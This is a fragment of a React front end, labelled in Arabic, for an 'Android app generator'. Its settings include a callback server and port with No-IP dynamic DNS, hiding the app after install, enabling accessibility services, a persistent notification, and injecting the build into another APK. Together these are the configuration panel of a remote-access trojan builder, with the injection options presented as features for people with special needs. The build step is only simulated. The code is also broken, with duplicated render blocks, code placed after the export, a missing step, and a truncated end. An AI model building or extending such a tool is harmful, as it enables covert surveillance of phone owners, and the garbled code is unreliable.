          ))
        ) : (
          <Grid item xs={12}>
            <Paper className={classes.paper} style={{ textAlign: 'center', padding: '20px' }}>
              <Typography variant="body1">
                لا توجد عمليات بناء سابقة. قم بإنشاء تطبيق جديد باستخدام النموذج أعلاه.
              </Typography>
            </Paper>
          </Grid>
        )}
      </Grid>
      
      {/* رسائل التنبيه */}
      <Snackbar open={snackbar.open} autoHideDuration={6000} onClose={handleCloseSnackbar}>
        <Alert onClose={handleCloseSnackbar} severity={snackbar.severity}>
          {snackbar.message}
        </Alert>
      </Snackbar>
    </Container>
  );
};

export default ApkBuilder;

const handleCloseSnackbar = () => {
  setSnackbar({
    ...snackbar,
    open: false,
  });
};

const getStepContent = (step) => {
  switch (step) {
    case 0: // معلومات التطبيق
      return (
        <>
          <Typography variant="h6" gutterBottom>
            معلومات التطبيق الأساسية
          </Typography>
          
          <FormControl className={classes.formControl}>
            <TextField
              label="اسم التطبيق"
              name="appName"
              value={formData.appName}
              onChange={handleChange}
              fullWidth
              required
              helperText="الاسم الذي سيظهر للمستخدم"
            />
          </FormControl>
          
          <FormControl className={classes.formControl}>
            <TextField
              label="اسم الحزمة"
              name="packageName"
              value={formData.packageName}
              onChange={handleChange}
              fullWidth
              required
              helperText="معرف فريد للتطبيق (مثال: com.company.app)"
            />
          </FormControl>
          
          <Grid container spacing={2}>
            <Grid item xs={12} sm={6}>
              <FormControl className={classes.formControl}>
                <TextField
                  label="اسم الإصدار"
                  name="versionName"
                  value={formData.versionName}
                  onChange={handleChange}
                  fullWidth
                  required
                  helperText="رقم الإصدار المرئي (مثال: 1.0.0)"
                />
              </FormControl>
            </Grid>
            <Grid item xs={12} sm={6}>
              <FormControl className={classes.formControl}>
                <TextField
                  label="رمز الإصدار"
                  name="versionCode"
                  type="number"
                  value={formData.versionCode}
                  onChange={handleChange}
                  fullWidth
                  required
                  helperText="رقم الإصدار الداخلي (يجب زيادته مع كل إصدار)"
                />
              </FormControl>
            </Grid>
          </Grid>
          
          <Typography variant="subtitle1" gutterBottom style={{ marginTop: '16px' }}>
            أيقونة التطبيق
          </Typography>
          
          <div className={classes.iconPreview}>
            {iconPreview ? (
              <img src={iconPreview} alt="أيقونة التطبيق" className={classes.iconImage} />
            ) : (
              <BuildIcon color="disabled" style={{ fontSize: 40 }} />
            )}
          </div>
          
          <input
            accept="image/*"
            className={classes.uploadInput}
            id="icon-button-file"
            type="file"
            onChange={handleIconChange}
          />
          <label htmlFor="icon-button-file">
            <Button
              variant="contained"
              color="default"
              component="span"
              startIcon={<CameraIcon />}
            >
              اختر أيقونة
            </Button>
          </label>
        </>
      );
    
    case 1: // إعدادات الخادم
      return (
        <>
          <Typography variant="h6" gutterBottom>
            إعدادات الاتصال بالخادم
          </Typography>
          
          <FormControl className={classes.formControl}>
            <TextField
              label="عنوان الخادم"
              name="serverUrl"
              value={formData.serverUrl}
              onChange={handleChange}
              fullWidth
              required
              helperText="عنوان IP أو اسم المضيف للخادم"
            />
          </FormControl>
          
          <FormControl className={classes.formControl}>
            <TextField
              label="منفذ الخادم"
              name="serverPort"
              value={formData.serverPort}
              onChange={handleChange}
              fullWidth
              required
              helperText="رقم المنفذ الذي يستمع عليه الخادم"
            />
          </FormControl>
          
          <FormControlLabel
            control={
              <Switch
                checked={formData.useNoIp}
                onChange={handleChange}
                name="useNoIp"
                color="primary"
              />
            }
            label="استخدام No-IP"
          />
          
          {formData.useNoIp && (
            <>
              <FormControl className={classes.formControl}>
                <TextField
                  label="نطاق No-IP"
                  name="noIpDomain"
                  value={formData.noIpDomain}
                  onChange={handleChange}
                  fullWidth
                  required
                  helperText="نطاق No-IP الخاص بك (مثال: myserver.ddns.net)"
                />
              </FormControl>
              
              <FormControl className={classes.formControl}>
                <TextField
                  label="فترة التحديث (دقائق)"
                  name="noIpInterval"
                  type="number"
                  value={formData.noIpInterval}
                  onChange={handleChange}
                  fullWidth
                  required
                  helperText="الفترة الزمنية بين تحديثات No-IP (بالدقائق)"
                />
              </FormControl>
            </>
          )}
        </>
      );
    
    case 2: // خيارات متقدمة
      return (
        <>
          <Typography variant="h6" gutterBottom>
            خيارات متقدمة
          </Typography>
          
          <FormControl className={classes.formControl}>
            <TextField
              label="رابط عرض الويب"
              name="webViewUrl"
              value={formData.webViewUrl}
              onChange={handleChange}
              fullWidth
              helperText="رابط موقع الويب لعرضه في التطبيق (اتركه فارغًا إذا لم تكن بحاجة إليه)"
            />
          </FormControl>
          
          <FormControl className={classes.formControl}>
            <TextField
              label="عنوان الإشعار"
              name="notificationTitle"
              value={formData.notificationTitle}
              onChange={handleChange}
              fullWidth
              helperText="عنوان الإشعار الدائم (اتركه فارغًا لعدم إظهار إشعار)"
            />
          </FormControl>
          
          <FormControlLabel
            control={
              <Switch
                checked={formData.hideAfterInstall}
                onChange={handleChange}
                name="hideAfterInstall"
                color="primary"
              />
            }
            label="إخفاء التطبيق بعد التثبيت"
          />
          
          <FormControlLabel
            control={
              <Switch
                checked={formData.accessibilityEnabled}
                onChange={handleChange}
                name="accessibilityEnabled"
                color="primary"
              />
            }
            label="تمكين خدمات إمكانية الوصول"
          />
          
          <Divider className={classes.divider} />
          
          <Typography variant="h6" gutterBottom>
            إعدادات SDK
          </Typography>
          
          <Grid container spacing={2}>
            <Grid item xs={12} sm={6}>
              <FormControl className={classes.formControl}>
                <InputLabel>الحد الأدنى لـ SDK</InputLabel>
                <Select
                  name="minSdk"
                  value={formData.minSdk}
                  onChange={handleChange}
                  fullWidth
                >
                  <MenuItem value={21}>Android 5.0 (API 21)</MenuItem>
                  <MenuItem value={23}>Android 6.0 (API 23)</MenuItem>
                  <MenuItem value={26}>Android 8.0 (API 26)</MenuItem>
                  <MenuItem value={29}>Android 10.0 (API 29)</MenuItem>
                  <MenuItem value={33}>Android 13.0 (API 33)</MenuItem>
                </Select>
              </FormControl>
            </Grid>
            <Grid item xs={12} sm={6}>
              <FormControl className={classes.formControl}>
                <InputLabel>SDK المستهدف</InputLabel>
                <Select
                  name="targetSdk"
                  value={formData.targetSdk}
                  onChange={handleChange}
                  fullWidth
                >
                  <MenuItem value={33}>Android 13.0 (API 33)</MenuItem>
                  <MenuItem value={34}>Android 14.0 (API 34)</MenuItem>
                  <MenuItem value={35}>Android 15.0 (API 35)</MenuItem>
                </Select>
              </FormControl>
            </Grid>
          </Grid>
        </>
      );
    
    case 4: // بناء التطبيق
      return (
        <>
          <Typography variant="h6" gutterBottom>
            ملخص إعدادات التطبيق
          </Typography>
          
          <Grid container spacing={2}>
            <Grid item xs={12} md={6}>
              <Typography variant="subtitle1">معلومات التطبيق</Typography>
              <Typography variant="body2">اسم التطبيق: {formData.appName}</Typography>
              <Typography variant="body2">اسم الحزمة: {formData.packageName}</Typography>
              <Typography variant="body2">الإصدار: {formData.versionName} (رمز: {formData.versionCode})</Typography>
              
              <Typography variant="subtitle1" style={{ marginTop: '16px' }}>إعدادات الخادم</Typography>
              <Typography variant="body2">عنوان الخادم: {formData.serverUrl}</Typography>
              <Typography variant="body2">منفذ الخادم: {formData.serverPort}</Typography>
              {formData.useNoIp && (
                <>
                  <Typography variant="body2">نطاق No-IP: {formData.noIpDomain}</Typography>
                  <Typography variant="body2">فترة التحديث: {formData.noIpInterval} دقيقة</Typography>
                </>
              )}
            </Grid>
            
            <Grid item xs={12} md={6}>
              <Typography variant="subtitle1">الخيارات المتقدمة</Typography>
              {formData.webViewUrl && (
                <Typography variant="body2">رابط عرض الويب: {formData.webViewUrl}</Typography>
              )}
              {formData.notificationTitle && (
                <Typography variant="body2">عنوان الإشعار: {formData.notificationTitle}</Typography>
              )}
              <Typography variant="body2">إخفاء بعد التثبيت: {formData.hideAfterInstall ? 'نعم' : 'لا'}</Typography>
              <Typography variant="body2">خدمات إمكانية الوصول: {formData.accessibilityEnabled ? 'ممكّنة' : 'معطلة'}</Typography>
              
              <Typography variant="subtitle1" style={{ marginTop: '16px' }}>إعدادات SDK</Typography>
              <Typography variant="body2">الحد الأدنى لـ SDK: {formData.minSdk}</Typography>
              <Typography variant="body2">SDK المستهدف: {formData.targetSdk}</Typography>
              
              <Typography variant="subtitle1" style={{ marginTop: '16px' }}>خيارات ذوي الاحتياجات الخاصة</Typography>
              <Typography variant="body2">حقن التطبيق: {formData.injectApk ? 'ممكّن' : 'معطل'}</Typography>
              {formData.injectApk && formData.apkToInject && (
                <Typography variant="body2">ملف APK: {formData.apkToInject.name}</Typography>
              )}
              <Typography variant="body2">منع التحويل البرمجي: {formData.preventProgrammaticRedirection ? 'ممكّن' : 'معطل'}</Typography>
              <Typography variant="body2">خيارات إمكانية الوصول المتقدمة: {formData.specialAccessibilityOptions ? 'ممكّنة' : 'معطلة'}</Typography>
              {formData.customConnectionPort && (
                <Typography variant="body2">منفذ اتصال مخصص: {formData.customConnectionPort}</Typography>
              )}
              <Typography variant="body2">خيار إعادة البناء: {formData.rebuildOption ? 'ممكّن' : 'معطل'}</Typography>
            </Grid>
          </Grid>
          
          <div className={classes.buttonContainer}>
            <Button
              variant="contained"
              color="primary"
              onClick={handleBuild}
              disabled={loading || !formData.appName || !formData.packageName || !formData.serverUrl}
              startIcon={loading ? <CircularProgress size={24} /> : <BuildIcon />}
            >
              {loading ? 'جاري البناء...' : 'بناء التطبيق'}
            </Button>
          </div>
        </>
      );
    
    default:
      return 'خطوة غير معروفة';
  }
};

const handleBack = () => {
  setActiveStep((prevActiveStep) => prevActiveStep - 1);
};

const handleReset = () => {
  setActiveStep(0);
  setFormData({
    appName: '',
    packageName: 'com.company.app',
    versionName: '1.0.0',
    versionCode: 1,
    serverUrl: '',
    serverPort: '8080',
    useNoIp: false,
    noIpDomain: '',
    noIpInterval: 15,
    webViewUrl: '',
    notificationTitle: '',
    hideAfterInstall: false,
    accessibilityEnabled: false,
    minSdk: 21,
    targetSdk: 35,
    // إعادة تعيين الخيارات الجديدة
    injectApk: false,
    preventProgrammaticRedirection: false,
    specialAccessibilityOptions: false,
    customConnectionPort: '',
    rebuildOption: false,
    apkToInject: null,
  });
  setIconFile(null);
  setIconPreview(null);
};

const handleChange = (e) => {
  const { name, value, type, checked } = e.target;
  setFormData({
    ...formData,
    [name]: type === 'checkbox' ? checked : value,
  });
};

const handleIconChange = (e) => {
  if (e.target.files && e.target.files[0]) {
    const file = e.target.files[0];
    setIconFile(file);
    
    const reader = new FileReader();
    reader.onload = (event) => {
      setIconPreview(event.target.result);
    };
    reader.readAsDataURL(file);
  }
};

// التحقق من صحة البيانات قبل الانتقال للخطوة التالية
const validateStep = (step) => {
  switch (step) {
    case 0: // معلومات التطبيق
      return formData.appName && formData.packageName && formData.versionName && formData.versionCode;
    case 1: // إعدادات الخادم
      return formData.serverUrl && formData.serverPort && (!formData.useNoIp || (formData.useNoIp && formData.noIpDomain));
    case 2: // خيارات متقدمة
      return true; // لا توجد حقول إلزامية في هذه الخطوة
    case 3: // خيارات ذوي الاحتياجات الخاصة
      return !formData.injectApk || (formData.injectApk && formData.apkToInject);
    default:
      return true;
  }
};

const handleBuild = async () => {
  try {
    setLoading(true);
    
    // محاكاة تأخير الشبكة
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    // إضافة معلومات إضافية للبناء بناءً على الخيارات الجديدة
    const buildDetails = formData.injectApk ? 'تطبيق محقون' : 'تطبيق جديد';
    const accessibilityInfo = formData.specialAccessibilityOptions ? ' مع خيارات إمكانية وصول متقدمة' : '';
    const newBuild = {
      id: Date.now().toString(),
      ...formData,
      buildType: buildDetails + accessibilityInfo,
      buildStatus: 'completed',
      createdAt: new Date().toISOString(),
      buildOutput: {
        apkPath: `/downloads/${formData.appName.replace(/\s+/g, '-').toLowerCase()}-${formData.versionName}.apk`,
        downloadUrl: `https://example.com/downloads/${formData.appName.replace(/\s+/g, '-').toLowerCase()}-${formData.versionName}.apk`,
        qrCode: `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://example.com/downloads/${formData.appName.replace(/\s+/g, '-').toLowerCase()}-${formData.versionName}.apk`,
      },
    };
    
    setBuilds([newBuild, ...builds]);
    
    setSnackbar({
      open: true,
      message: 'تم بناء التطبيق بنجاح!',
      severity: 'success',
    });
    
    handleReset();
  } catch (error) {
    console.error('Error building APK:', error);
    setSnackbar({
      open: true,
      message: 'حدث خطأ أثناء بناء التطبيق',
      severity: 'error',
    });
  } finally {
    setLoading(false);
  }
};

return (
  <Container maxWidth="lg" className={classes.container}>
    <Typography variant="h4" component="h1" gutterBottom>
      مولّد تطبيقات الأندرويد
    </Typography>
    
    {/* مراحل البناء */}
    <Paper className={classes.paper}>
      <Stepper activeStep={activeStep} className={classes.stepper}>
        {steps.map((label) => (
          <Step key={label}>
            <StepLabel>{label}</StepLabel>
          </Step>
        ))}
      </Stepper>
      
      {getStepContent(activeStep)}
      
      <div className={classes.buttonContainer}>
        <Button
          disabled={activeStep === 0}
          onClick={handleBack}
          className={classes.button}
        >
          السابق
        </Button>
        
        {activeStep < steps.length - 1 ? (
          <Button
            variant="contained"
            color="primary"
            onClick={handleNext}
            className={classes.button}
            disabled={activeStep === 0 && (!formData.appName || !formData.packageName)}
          >
            التالي
          </Button>
        ) : null}
      </div>
    </Paper>
    
    {/* عمليات البناء السابقة */}
    <Typography variant="h5" gutterBottom>
      عمليات البناء السابقة
    </Typography>
    
    <Grid container spacing={3}>
      {loading && builds.length === 0 ? (
        <Grid item xs={12}>
          <Paper className={classes.paper} style={{ textAlign: 'center', padding: '40px' }}>
            <CircularProgress />
            <Typography variant="body1" style={{ marginTop: '16px' }}>
              جاري تحميل عمليات البناء السابقة...
            </Typography>
          </Paper>
        </Grid>
      ) : builds.length > 0 ? (
        builds.map((build) => (
          <Grid item xs={12} md={6} key={build.id}>
            <Card className={classes.buildCard}>
              <CardContent>
                <Typography variant="h6">{build.appName}</Typography>
                <Typography variant="body2" color="textSecondary">
                  {build.packageName} | الإصدار: {build.versionName}
                </Typography>
                
                {build.buildType && (
                  <Typography variant="body2" color="textSecondary" style={{ marginTop: '4px' }}>
                    نوع البناء: {build.buildType}
                  </Typography>
                )}
                
                <div className={classes.buildStatus}>
                  {build.buildStatus === 'completed' && (
                    <>
                      <CheckCircleIcon color="primary" className={classes.statusIcon} />
                      <Typography>تم البناء بنجاح</Typography>
                    </>
                  )}
                  {build.buildStatus === 'failed' && (
                    <>
                      <CancelIcon color="error" className={classes.statusIcon} />
                      <Typography>فشل البناء</Typography>
                    </>
                  )}
                  {build.buildStatus === 'in_progress' && (
                    <>
                      <CircularProgress size={20} className={classes.statusIcon} />
                      <Typography>جاري البناء...</Typography>
                    </>
                  )}
                </div>
                
                <Typography variant="body2" color="textSecondary">
                  تاريخ البناء: {new Date(build.createdAt).toLocaleString('ar-SA')}
                </Typography>
                
                {build.buildStatus === 'failed' && build.buildOutput?.error && (
                  <Alert severity="error" style={{ marginTop: '8px' }}>
                    {build.buildOutput.error}
                  </Alert>
                )}
                
                {build.buildStatus === 'completed' && build.buildOutput && (
                  <Grid container spacing={2} style={{ marginTop: '8px' }}>
                    <Grid item xs={12} sm={6}>
                      <Typography variant="subtitle2">رابط التحميل:</Typography>
                      <Typography variant="body2" noWrap>
                        {build.buildOutput.downloadUrl}
                      </Typography>
                    </Grid>
                    <Grid item xs={12} sm={6}>
                      <div className={classes.qrCode}>
                        <img 
                          src={build.buildOutput.qrCode} 
                          alt="QR Code" 
                          style={{ maxWidth: '100%', maxHeight: '100%' }} 
                        />
                      </div>
                    </Grid>
                  </Grid>
                )}
              </CardContent>
              
              <CardActions>
                {build.buildStatus === 'completed' && (
                  <Button
                    startIcon={<DownloadIcon />}
                    color="primary"
                    onClick={() => window.open(build.buildOutput.downloadUrl, '_blank')}
                  >
                    تحميل
                  </Button>
                )}
                
                {build.buildStatus === 'failed' && (
                  <Button
                    startIcon={<RefreshIcon />}
                    color="primary"
                    onClick={() => alert('سيتم تفعيل هذه الميزة لاحقًا')}
                  >
                    إعادة المحاولة
                  </Button>
                )}
                
                <Button
                  startIcon={<DeleteIcon />}
                  color="secondary"
                  onClick={() => handleDeleteBuild(build.id)}
                >
                  حذف
                </Button>
              </CardActions>
            </Card>
          </Grid>
        ))
      ) : (
        <Grid item xs={12}>
          <Paper className={classes.paper} style={{ textAlign: 'center', padding: '20px' }}>
            <Typography variant="body1">
              لا توجد عمليات بناء سابقة. قم بإنشاء تطبيق جديد باستخدام النموذج أعلاه.
            </Typography>
          </Paper>
        </Grid>
      )}
    </Grid>
    
    {/* رسائل التنبيه */}
    <Snackbar open={snackbar.open} autoHideDuration={6000} onClose={handleCloseSnackbar}>
      <Alert onClose={handleCloseSnackbar} severity={snackbar.severity}>
        {snackbar.message}
      </Alert>
    </Snackbar>
  </Container>
);
};

export default ApkBuilder;

const handleCloseSnack